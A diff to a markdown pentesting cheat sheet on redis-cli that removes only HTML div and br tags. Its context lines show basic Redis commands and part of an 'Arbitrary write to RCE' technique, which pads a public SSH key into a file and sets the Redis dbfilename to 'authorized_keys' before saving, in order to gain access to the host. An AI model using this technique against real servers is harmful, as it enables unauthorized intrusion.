@@ -6,8 +6,6 @@ tags: ["redis", "redis-cli", "privesc"]
 
 ### Basic
 
-<div>
-
 ```console
 # Connect
 redis-cli -h 127.0.0.1
@@ -33,15 +31,9 @@ incr key
 get key
 ```
 
-<div>
-
-<br>
-
 ---
 
 ### Abuse #1: Arbitrary write to RCE
-
-<div>
 
 ```console
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
@@ -68,6 +60,3 @@ redis-cli -h 127.0.0.1 config set dbfilename "authorized_keys"
 redis-cli -h 127.0.0.1 save
 ```
 
-</div>
-
-<br>
